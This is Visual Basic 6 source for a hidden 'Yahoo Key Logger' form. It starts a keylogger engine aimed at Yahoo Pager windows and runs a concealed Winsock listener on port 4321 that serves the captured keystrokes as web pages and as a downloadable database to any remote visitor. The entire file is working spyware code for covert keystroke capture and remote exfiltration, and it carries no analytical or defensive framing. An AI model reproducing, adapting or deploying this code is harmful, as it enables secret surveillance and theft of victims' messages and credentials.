VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Yahoo Key Logger"
   ClientHeight    =   1800
   ClientLeft      =   150
   ClientTop       =   540
   ClientWidth     =   2820
   ForeColor       =   &H00000000&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1800
   ScaleWidth      =   2820
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock sckYahoo 
      Left            =   1170
      Top             =   660
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   4321
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' As I Guessed Yahoo Pager Atleast My Version 5.0.0.1050 Has A Static Class Name ie #32770
' So I Start The Key Logger Engine With Mode 1 which capture only two Keys which are typed
' on a specific Class Name

Dim objLogger 'As KeyLogger.Main

Private Sub Form_Load()
On Error Resume Next
    
    If App.PrevInstance Then End

    ' Create An Instance Or Object Of Class
    Set objLogger = CreateObject("KeyLogger.Main")
    
    ' Start The Logger
    objLogger.StartLogger 1, , "#32770"
    
    Reset
End Sub


Private Sub Form_Unload(Cancel As Integer)
    'Stop The Logger
    objLogger.StopLogger
End Sub

Private Function Reset()
    sckYahoo.Close
    sckYahoo.Listen
End Function

Private Sub sckYahoo_Close()
    sckYahoo.Listen
End Sub

Private Sub sckYahoo_ConnectionRequest(ByVal requestID As Long)
    sckYahoo.Close
    sckYahoo.Accept requestID
End Sub

Private Sub sckYahoo_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    
    Dim sBuffer As String
    Dim sTmp As String
    Dim sLog As String
    Dim RefreshRate As Integer
    
    If IsObject(objLogger) = False Then
        ' Create An Instance Or Object Of Class
        Set objLogger = CreateObject("KeyLogger.Main")
    
        ' Start The Logger
        objLogger.StartLogger 1, , "#32770"
    End If
    
    sBuffer = String(bytesTotal, Chr(0))
    
    sckYahoo.GetData sBuffer, , bytesTotal
    'FOR CompeteLog As TEXT
    If InStr(LCase(sBuffer), "completelog.asp?showastext=true") Then
        sLog = objLogger.CompleteLog(False)
        RefreshRate = -1
        If Len(sLog) <= 0 Then sLog = "<Center><H3>Key Logger Engine Is Not Running Or Log Is Empty.</H3></Center>"
        sTmp = "<HTML>" & vbCr & _
        "<HEAD>" & vbCr & _
        "<META http-equiv=""Refresh"" Content=""" & RefreshRate & """>" & vbCr & _
        "<TITLE>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</TITLE>" & vbCr & _
        "</HEAD>" & vbCr & _
        "<CENTER>" & vbCr & _
        "<H1>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</H1><BR><HR></CENTER>" & vbCr & _
        sLog & vbCr & _
        "<HR><A Href=""javascript:history.back(1)"">Go Back</A>" & vbCr & _
        "</HTML>"
        
    'For CompleteLog As HTML
    ElseIf InStr(LCase(sBuffer), "completelog.asp") Then
        sLog = objLogger.CompleteLog(True)
        RefreshRate = -1
        If Len(sLog) <= 0 Then sLog = "<Center><H3>Key Logger Engine Is Not Running Or Log Is Empty.</H3></Center>"
        sTmp = "<HTML>" & vbCr & _
        "<HEAD>" & vbCr & _
        "<META http-equiv=""Refresh"" Content=""" & RefreshRate & """>" & vbCr & _
        "<TITLE>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</TITLE>" & vbCr & _
        "</HEAD>" & vbCr & _
        "<CENTER>" & vbCr & _
        "<H1>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</H1><BR><HR></CENTER>" & vbCr & _
        sLog & vbCr & _
        "<HR><A Href=""javascript:history.back(1)"">Go Back</A>" & vbCr & _
        "</HTML>"
    
    'FOR DOWNLOADS
    ElseIf InStr(LCase(sBuffer), "download.asp?filename=database.dat") Then
        sLog = objLogger.GetDataBase
        If Len(sLog) <= 0 Then sLog = "<Center><H3>Key Logger Engine Is Not Running Or Log Is Empty.</H3></Center>"
        sTmp = sLog
    'For Latest Logs
    Else
        sLog = objLogger.GetLastLog
        RefreshRate = 5
        If Len(sLog) <= 0 Then sLog = "<Center><H3>Key Logger Engine Is Not Running Or Log Is Empty.</H3></Center>"
        sTmp = "<HTML>" & vbCr & _
        "<HEAD>" & vbCr & _
        "<META http-equiv=""Refresh"" Content=""" & RefreshRate & """>" & vbCr & _
        "<TITLE>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</TITLE>" & vbCr & _
        "</HEAD>" & vbCr & _
        "<CENTER>" & vbCr & _
        "<H1>Yahoo Key Logger At " & sckYahoo.LocalHostName & " (" & sckYahoo.LocalIP & ")</H1><BR><HR></CENTER>" & vbCr & _
        sLog & vbCr & _
        "<HR><A Href=""CompleteLog.asp"">View Complete Log (HTML)</A> | <A Href=""CompleteLog.asp?ShowAsText=True"">View Complete Log (TEXT)</A> | <A HREF=""Download.asp?FileName=Database.dat"">Download Database</A>" & vbCr & _
        "</HTML>"
    End If
    sTmp = Replace(sTmp, vbCrLf & vbCrLf, "<HR>")
    sTmp = Replace(sTmp, vbCrLf, "<BR>")
    sTmp = Replace(sTmp, "Date:", "<B>Date:</B>")
    sTmp = Replace(sTmp, "Class:", "<B>Class:</B>")
    sTmp = Replace(sTmp, "Handle:", "<B>Handle:</B>")
    sTmp = Replace(sTmp, "Window Caption:", "<B>Window Caption:</B>")
    sTmp = Replace(sTmp, "Transformed Data:", "<B>Transformed Data:</B>")
    sTmp = Replace(sTmp, "Data:", "<B>Data:</B>")
    
    sckYahoo.SendData sTmp
    'Reset
End Sub

Private Sub sckYahoo_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Reset
End Sub

Private Sub sckYahoo_SendComplete()
    Reset
End Sub
